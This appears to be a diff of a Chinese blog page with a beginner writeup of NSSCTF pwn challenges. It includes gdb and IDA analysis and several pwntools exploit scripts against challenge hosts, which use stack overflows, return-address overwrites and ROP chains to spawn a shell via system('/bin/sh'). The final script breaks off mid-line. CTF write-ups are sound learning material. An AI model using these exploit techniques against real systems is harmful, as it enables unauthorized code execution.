@@ -10,7 +10,7 @@
 <meta property='og:description' content="PWN系列，二进制综合基础，10道急速入门">
 <meta property='og:url' content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-03T18:12:18&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-08T16:19:55&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png' />
 <meta name="twitter:title" content="NSSctf-专题PWN-writeup">
 <meta name="twitter:description" content="PWN系列，二进制综合基础，10道急速入门"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png' />
@@ -717,16 +717,12 @@ unicode: "ece7"
   <ol>
     <li><a href="#pwn介绍">PWN介绍</a></li>
     <li><a href="#pwntools与gbd使用">Pwntools与GBD使用</a></li>
-  </ol>
-
-  <ol>
     <li><a href="#整数溢出">整数溢出</a></li>
-    <li><a href="#rop">ROP</a></li>
     <li><a href="#ret2text及其变种">ret2text及其变种</a></li>
-    <li><a href="#函数调用">函数调用</a></li>
+    <li><a href="#rop">ROP</a></li>
     <li><a href="#ropgadget">ROPgadget</a></li>
-    <li><a href="#ret2sys">ret2sys</a></li>
     <li><a href="#ret2shellcode">ret2shellcode</a></li>
+    <li><a href="#ret2sys">ret2sys</a></li>
     <li><a href="#ret2libc">ret2libc</a></li>
     <li><a href="#综合练习">综合练习</a></li>
   </ol>
@@ -823,7 +819,7 @@ unicode: "ece7"
     >PWN-3</a>中出现的前置知识点，在这里有涉及到的我都会有所引用出来。</p>
 <h2 id="pwn介绍">PWN介绍
 </h2><p>题目：xxx；就是没有题目，啥也没</p>
-<p>上程序nc连接看看，别说你不会nc&hellip;&hellip;</p>
+<p>上程序nc连接看看，别说你不会nc&hellip;&hellip; <a class="link" href="PWN-1" >PWN-1</a></p>
 <p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1.png"
 	width="1014"
 	height="164"
@@ -867,8 +863,20 @@ unicode: "ece7"
 ></p>
 <p>看到下一步是被PWN通了的，我们可以进行交互模式了，用ls、cat命令拿到flag吧。</p>
 <h2 id="pwntools与gbd使用">Pwntools与GBD使用
-</h2><p>&laquo;&laquo;&laquo;&lt; HEAD
-还是没题目&hellip;</p>
+</h2><p>还是没题目&hellip; <a class="link" href="PWN-2" >PWN-2</a></p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/5.png"
+	width="781"
+	height="204"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/5_hu_974624441b7ab9d3.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/5_hu_5ff6e436f49730db.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="918px"
+	
+></p>
+<p>服了怎么开了canary啊，不是要栈溢出吗？</p>
 <p>IDA分析：</p>
 <p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4.png"
 	width="684"
@@ -884,25 +892,525 @@ unicode: "ece7"
 		data-flex-basis="475px"
 	
 ></p>
-<h1 id="这题和上题不同的是这回v5要等于520才能执行system函数但v5再此前是被赋值位1314的单靠我们输入字符给程序不能拿到flag用其它手段去修改v5">这题和上题不同的是，这回v5要等于“520”才能执行system函数，但v5再此前是被赋值位“1314”的，单靠我们输入字符给程序不能拿到flag，用其它手段去修改v5。
-</h1><p>取自[鹏城杯 2024]tArScR</p>
-<p>题目：我的RSA挺有意思。</p>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<p>191b05fa45e02dc8995178e6a8d2c0c238003afb</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote>
+<p>这题和上题不同的是，这回v5要等于“520”才能执行system函数，但v5再此前是被赋值位“1314”的，单靠我们输入字符给程序不能拿到flag，用其它手段去修改v5。</p>
+<p>这不明摆要栈溢出覆盖v5？</p>
+<p>别急我们来gdb调试一下（gdb调试的确很难，涉及简化指令操作、汇编审计等，可以先看我写的文章再来用gdb）</p>
+<p>开gdb，断点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">break main
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/6.png"
+	width="1395"
+	height="299"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/6_hu_50701a557153789b.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/6_hu_492289174603babd.png 1024w"
+	loading="lazy"
+	
+		alt="pwndbg"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="466"
+		data-flex-basis="1119px"
+	
+></p>
+<p>输入r运行（run）</p>
+<p>这时候就会输出调试界面了，你可以用n一步步跳，看寄存器、地址等变化，我们要找一下canary的位置，看是否在v5之下，这样子我们就可以覆盖v5，但覆盖长度不超过v5，不会让canary被触发。</p>
+<p>查看栈：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stack 40
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/7.png"
+	width="1420"
+	height="445"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/7_hu_58017d81254994e8.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/7_hu_badb6a497419eb82.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="319"
+		data-flex-basis="765px"
+	
+></p>
+<p>第一行的是v4位置，第二行是canary位置（canary位置一般都在末尾有00整数的地址，除非出题人特别还去调了canary的位置就另说😄），欸？v5去哪了，v5应该是0x522（十进制转为520），这里没看到0x522的身影。</p>
+<p>看回IDA：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/8.png"
+	width="725"
+	height="344"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/8_hu_93087ebc19dd5194.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/8_hu_8858c6a4a4b81d69.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>当前<code>stack</code>输出中，<code>rbp</code>的地址是<code>0x7fffffffdaf0</code>；</p>
+<p>所以说应当是<code>v5的地址 = 0x7fffffffdaf0 - 0xC = 0x7fffffffdae4</code></p>
+<p>这里调试界面似乎没看到v5呢&hellip;</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>查看当前<code>stack</code>输出，<code>0x7fffffffdae4</code>这个地址<strong>没有直接显示在<code>stack 40</code>的条目里</strong>，但它位于两个显示条目之间：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><code>stack</code>条目序号</th>
+          <th>地址</th>
+          <th>说明</th>
+          <th>与<code>v5</code>地址的关系</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>00:0000</td>
+          <td>0x7fffffffdae0</td>
+          <td><code>v4</code>的地址（<code>char[4]</code>数组）</td>
+          <td><code>v5</code>地址（<code>dae4</code>）在其<strong>高地址侧</strong>（相差 4 字节，因<code>v4</code>占 4 字节）</td>
+      </tr>
+      <tr>
+          <td>01:0008</td>
+          <td>0x7fffffffdae8</td>
+          <td>Canary（<code>v6</code>）的地址</td>
+          <td><code>v5</code>地址（<code>dae4</code>）在其<strong>低地址侧</strong>（相差 4 字节，因<code>v5</code>占 4 字节）</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>简单说：<code>v5</code>夹在<code>v4</code>（<code>dae0</code>）和<code>Canary</code>（<code>dae8</code>）之间，地址是<code>0x7fffffffdae4</code>，对应栈中 “<code>dae0</code>之后、<code>dae8</code>之前” 的 4 字节内存。</p>
+<p>虽然<code>stack</code>命令没直接显示<code>dae4</code>，但可在<code>pwndbg</code>中用<code>x</code>命令直接查看该地址的<code>v5</code>值（指定<code>int</code>类型格式）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 格式说明：/w=4字节（int类型），x=十六进制，查看0x7fffffffdae4地址
+</span></span><span class="line"><span class="cl">x/wx 0x7fffffffdae4
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote></blockquote>
+<blockquote class="alert alert-tip">
+    <blockquote>
+<p>之所以在<code>stack 40</code>中看不到<code>v5</code>的地址，是因为<code>stack</code>命令默认按 “8 字节步长” 显示栈条目（64 位系统），而<code>v5</code>的地址<code>dae4</code>是 “非 8 字节对齐” 的中间地址，需手动查看。</p></blockquote></blockquote>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/9.png"
+	width="885"
+	height="140"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/9_hu_d1b370dc1283d81c.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/9_hu_43b1ffccfa4e0f64.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="632"
+		data-flex-basis="1517px"
+	
+></p>
+<p>这时候我们就知道v5在canary之上了，覆盖v5的话，canary不会知道。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">23886</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x208</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hello! Input a number:&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可能我的WP比较复杂，看起来非常非常难，但只不过我把每一步都细化了，每一步都是我的思考直面呈现给你，让你PWN-0基础都能接近看懂的。</p>
 <h2 id="整数溢出">整数溢出
-</h2><h2 id="rop">ROP
-</h2><h2 id="ret2text及其变种">ret2text及其变种
-</h2><h2 id="函数调用">函数调用
-</h2><h2 id="ropgadget">ROPgadget
-</h2><h2 id="ret2sys">ret2sys
-</h2><h2 id="ret2shellcode">ret2shellcode
-</h2><h2 id="ret2libc">ret2libc
+</h2><p><a class="link" href="PWN-3" >PWN-3</a></p>
+<p>checksec</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/10.png"
+	width="660"
+	height="179"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/10_hu_d71ee701b385a61e.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/10_hu_9fe6b77a5a4843f8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="368"
+		data-flex-basis="884px"
+	
+></p>
+<p>IDA64分析：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/11.png"
+	width="650"
+	height="205"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/11_hu_1285563de9531caa.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/11_hu_e3486e12b18fe565.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="760px"
+	
+></p>
+<p>在函数目录看到了vuln函数：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/12.png"
+	width="1080"
+	height="683"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/12_hu_4771ebbe9d479370.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/12_hu_bc3318888b7b107e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="379px"
+	
+></p>
+<p>地址也给了：0x4011dd</p>
+<p>那我们在在栈溢出之后，用这个vuln地址覆盖返回地址，让程序返回到这个地址执行<code>/bin/sh</code>。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node7.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">21218</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x4011dd</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ret2text及其变种">ret2text及其变种
+</h2><p><a class="link" href="PWN-4" >PWN-4</a></p>
+<p>checksec：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/13.png"
+	width="630"
+	height="194"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/13_hu_f19faaf3f4ca4e01.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/13_hu_3a8a8c6a5e78939.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="324"
+		data-flex-basis="779px"
+	
+></p>
+<p>IDA64分析：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/14.png"
+	width="700"
+	height="211"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/14_hu_6849e26c3d693007.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/14_hu_94860c7cbf5d99d2.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="331"
+		data-flex-basis="796px"
+	
+></p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/15.png"
+	width="565"
+	height="209"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/15_hu_d4535932255a187d.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/15_hu_c4f622ce6c52a5b5.png 1024w"
+	loading="lazy"
+	
+		alt="vuln函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="648px"
+	
+></p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">28672</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x4011ff</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="rop">ROP
+</h2><p><a class="link" href="PWN-5" >PWN-5</a></p>
+<p>checksec：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/16.png"
+	width="609"
+	height="234"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/16_hu_d793394d041a98bc.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/16_hu_bf030dfe2f0f89b0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="624px"
+	
+></p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/18.png"
+	width="1215"
+	height="695"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/18_hu_426e1a73daded7b1.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/18_hu_79cfc03db213edb9.png 1024w"
+	loading="lazy"
+	
+		alt="vuln函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="419px"
+	
+></p>
+<p>vuln = 0x4011dd</p>
+<p>题目都给提示了，那就是构造ROP攻击链了，比较简单，多加个ret的gadget就可以了，用ROPgadget命令查询到ret的gadget地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary main <span class="p">|</span> grep <span class="s2">&#34;ret&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/17.png"
+	width="930"
+	height="250"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/17_hu_ffd219aa802a5c80.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/17_hu_e7c2344844fd45d8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="372"
+		data-flex-basis="892px"
+	
+></p>
+<p>ret_address = 0x000000000040101a</p>
+<p>exp内容就和上题差不多：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25982</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x4011dd</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ropgadget">ROPgadget
+</h2><p><a class="link" href="PWN-6" >PWN-6</a></p>
+<p>checksec：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/19.png"
+	width="665"
+	height="204"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/19_hu_c668a7a75614c910.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/19_hu_4b5401f9a8d907e3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="325"
+		data-flex-basis="782px"
+	
+></p>
+<p>这次你可以发现：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/20.png"
+	width="945"
+	height="384"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/20_hu_e3a72c5479855e36.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/20_hu_4072a7ec058350d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="590px"
+	
+></p>
+<p>system参数不再是/bin/sh了，那我们就需要构造出<code>system(&quot;/bin/sh&quot;);</code></p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/22.png"
+	width="1184"
+	height="660"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/22_hu_6f21cb1a88e7e281.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/22_hu_b15cd603448e3f8d.png 1024w"
+	loading="lazy"
+	
+		alt="system函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="430px"
+	
+></p>
+<p>system函数地址是0x4011A5</p>
+<p>system只需要传递一个参数，那么只需要rdi寄存器，那还是用到ROPgadget：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/21.png"
+	width="1045"
+	height="359"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/21_hu_b439eadc3614611e.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/21_hu_1aaf75bc19e82999.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="698px"
+	
+></p>
+<p>pop_rdi_ret = 0x000000000040125b</p>
+<p>Alt+T搜索<code>/bin/sh</code>字符串：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/23.png"
+	width="851"
+	height="165"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/23_hu_7efb778a6c9675d7.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/23_hu_8bf6950f6bc48618.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="515"
+		data-flex-basis="1237px"
+	
+></p>
+<p>/bin/sh的地址：0x404048</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node7.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">22526</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x404048</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x000000000040125b</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="mh">0x4011A5</span>
